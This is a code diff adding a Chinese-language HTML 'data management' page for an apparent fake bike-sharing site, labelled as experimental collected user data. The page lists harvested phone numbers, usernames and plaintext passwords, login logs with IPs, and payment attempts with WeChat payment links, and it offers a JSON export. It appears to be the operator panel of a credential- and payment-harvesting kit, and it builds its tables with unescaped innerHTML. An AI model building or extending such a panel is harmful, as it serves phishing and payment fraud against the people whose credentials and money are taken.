@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>青橙单车 - 数据管理</title>
+    <link rel="stylesheet" href="public/style.css">
+    <style>
+        .admin-container {
+            max-width: 1200px;
+            margin: 100px auto 20px;
+            padding: 20px;
+        }
+        
+        .admin-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        
+        .data-section {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .data-section h3 {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            border-bottom: 2px solid #00c851;
+            padding-bottom: 0.5rem;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+        
+        .data-table th,
+        .data-table td {
+            text-align: left;
+            padding: 12px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .data-table th {
+            background: #f8f9fa;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+        
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, #00c851, #00a041);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        
+        .btn-group {
+            margin-bottom: 1rem;
+        }
+        
+        .btn-admin {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            margin-right: 0.5rem;
+            cursor: pointer;
+        }
+        
+        .btn-admin:hover {
+            background: #0056b3;
+        }
+        
+        .btn-danger {
+            background: #dc3545;
+        }
+        
+        .btn-danger:hover {
+            background: #c82333;
+        }
+        
+        .json-viewer {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        
+        .password-field {
+            font-family: 'Courier New', monospace;
+            background: #ffe6e6;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <i class="fas fa-bicycle"></i>
+                青橙单车 - 数据管理
+            </div>
+            <div class="nav-menu">
+                <a href="index.html" class="nav-link">返回主页</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1>数据管理中心</h1>
+            <p>实验用途 - 收集到的用户数据</p>
+        </div>
+
+        <!-- 统计卡片 -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="userCount">0</div>
+                <div class="stat-label">注册用户</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="loginCount">0</div>
+                <div class="stat-label">登录次数</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="paymentCount">0</div>
+                <div class="stat-label">支付尝试</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="successCount">0</div>
+                <div class="stat-label">支付成功</div>
+            </div>
+        </div>
+
+        <!-- 操作按钮 -->
+        <div class="btn-group">
+            <button class="btn-admin" onclick="refreshData()">刷新数据</button>
+            <button class="btn-admin" onclick="exportData()">导出数据</button>
+            <button class="btn-admin btn-danger" onclick="clearAllData()">清除所有数据</button>
+        </div>
+
+        <!-- 用户注册数据 -->
+        <div class="data-section">
+            <h3>用户注册数据</h3>
+            <div id="userData"></div>
+        </div>
+
+        <!-- 登录日志 -->
+        <div class="data-section">
+            <h3>用户行为日志</h3>
+            <div id="userLogs"></div>
+        </div>
+
+        <!-- 支付数据 -->
+        <div class="data-section">
+            <h3>支付数据</h3>
+            <div id="paymentData"></div>
+        </div>
+
+        <!-- 原始JSON数据 -->
+        <div class="data-section">
+            <h3>原始JSON数据</h3>
+            <div id="rawData" class="json-viewer"></div>
+        </div>
+    </div>
+
+    <script>
+        // 刷新数据
+        function refreshData() {
+            loadUserData();
+            loadUserLogs();
+            loadPaymentData();
+            loadRawData();
+            updateStats();
+        }
+
+        // 更新统计
+        function updateStats() {
+            const users = JSON.parse(localStorage.getItem('users') || '[]');
+            const userLogs = JSON.parse(localStorage.getItem('userLogs') || '[]');
+            const paymentLogs = JSON.parse(localStorage.getItem('paymentLogs') || '[]');
+            const successLogs = JSON.parse(localStorage.getItem('paymentSuccessLogs') || '[]');
+
+            document.getElementById('userCount').textContent = users.length;
+            document.getElementById('loginCount').textContent = userLogs.filter(log => log.type === 'register').length;
+            document.getElementById('paymentCount').textContent = paymentLogs.length;
+            document.getElementById('successCount').textContent = Array.isArray(successLogs) ? successLogs.length : (successLogs ? 1 : 0);
+        }
+
+        // 加载用户数据
+        function loadUserData() {
+            const users = JSON.parse(localStorage.getItem('users') || '[]');
+            const userDataDiv = document.getElementById('userData');
+
+            if (users.length === 0) {
+                userDataDiv.innerHTML = '<p>暂无用户数据</p>';
+                return;
+            }
+
+            let html = '<table class="data-table"><thead><tr><th>ID</th><th>手机号</th><th>用户名</th><th>密码</th><th>注册时间</th></tr></thead><tbody>';
+            
+            users.forEach(user => {
+                html += `
+                    <tr>
+                        <td>${user.id}</td>
+                        <td>${user.phone}</td>
+                        <td>${user.username}</td>
+                        <td><span class="password-field">${user.password}</span></td>
+                        <td>${new Date(user.registerTime).toLocaleString()}</td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            userDataDiv.innerHTML = html;
+        }
+
+        // 加载用户日志
+        function loadUserLogs() {
+            const logs = JSON.parse(localStorage.getItem('userLogs') || '[]');
+            const logsDiv = document.getElementById('userLogs');
+
+            if (logs.length === 0) {
+                logsDiv.innerHTML = '<p>暂无日志数据</p>';
+                return;
+            }
+
+            let html = '<table class="data-table"><thead><tr><th>类型</th><th>手机号</th><th>用户名</th><th>密码</th><th>时间</th><th>IP</th></tr></thead><tbody>';
+            
+            logs.forEach(log => {
+                html += `
+                    <tr>
+                        <td>${log.type}</td>
+                        <td>${log.data.phone}</td>
+                        <td>${log.data.username}</td>
+                        <td><span class="password-field">${log.data.password}</span></td>
+                        <td>${new Date(log.timestamp).toLocaleString()}</td>
+                        <td>${log.ip}</td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            logsDiv.innerHTML = html;
+        }
+
+        // 加载支付数据
+        function loadPaymentData() {
+            const paymentLogs = JSON.parse(localStorage.getItem('paymentLogs') || '[]');
+            const paymentDiv = document.getElementById('paymentData');
+
+            if (paymentLogs.length === 0) {
+                paymentDiv.innerHTML = '<p>暂无支付数据</p>';
+                return;
+            }
+
+            let html = '<table class="data-table"><thead><tr><th>用户</th><th>套餐</th><th>金额</th><th>订单号</th><th>时间</th><th>微信链接</th></tr></thead><tbody>';
+            
+            paymentLogs.forEach(log => {
+                html += `
+                    <tr>
+                        <td>${log.user ? log.user.username : '未知'}</td>
+                        <td>${log.plan}</td>
+                        <td>¥${log.amount}</td>
+                        <td>${log.orderId}</td>
+                        <td>${new Date(log.timestamp).toLocaleString()}</td>
+                        <td><a href="${log.wechatUrl}" style="color: #00c851;">查看链接</a></td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            paymentDiv.innerHTML = html;
+        }
+
+        // 加载原始数据
+        function loadRawData() {
+            const allData = {
+                users: JSON.parse(localStorage.getItem('users') || '[]'),
+                userLogs: JSON.parse(localStorage.getItem('userLogs') || '[]'),
+                paymentLogs: JSON.parse(localStorage.getItem('paymentLogs') || '[]'),
+                paymentSuccessLogs: JSON.parse(localStorage.getItem('paymentSuccessLogs') || '[]'),
+                currentUser: JSON.parse(localStorage.getItem('currentUser') || 'null')
+            };
+
+            document.getElementById('rawData').textContent = JSON.stringify(allData, null, 2);
+        }
+
+        // 导出数据
+        function exportData() {
+            const allData = {
+                users: JSON.parse(localStorage.getItem('users') || '[]'),
+                userLogs: JSON.parse(localStorage.getItem('userLogs') || '[]'),
+                paymentLogs: JSON.parse(localStorage.getItem('paymentLogs') || '[]'),
+                paymentSuccessLogs: JSON.parse(localStorage.getItem('paymentSuccessLogs') || '[]'),
+                exportTime: new Date().toISOString()
+            };
+
+            const dataStr = JSON.stringify(allData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = `bicycle_data_${new Date().toISOString().slice(0,10)}.json`;
+            link.click();
+        }
+
+        // 清除所有数据
+        function clearAllData() {
+            if (confirm('确定要清除所有数据吗？此操作不可恢复！')) {
+                localStorage.clear();
+                alert('所有数据已清除');
+                refreshData();
+            }
+        }
+
+        // 页面加载时刷新数据
+        document.addEventListener('DOMContentLoaded', refreshData);
+    </script>
+</body>
+</html>
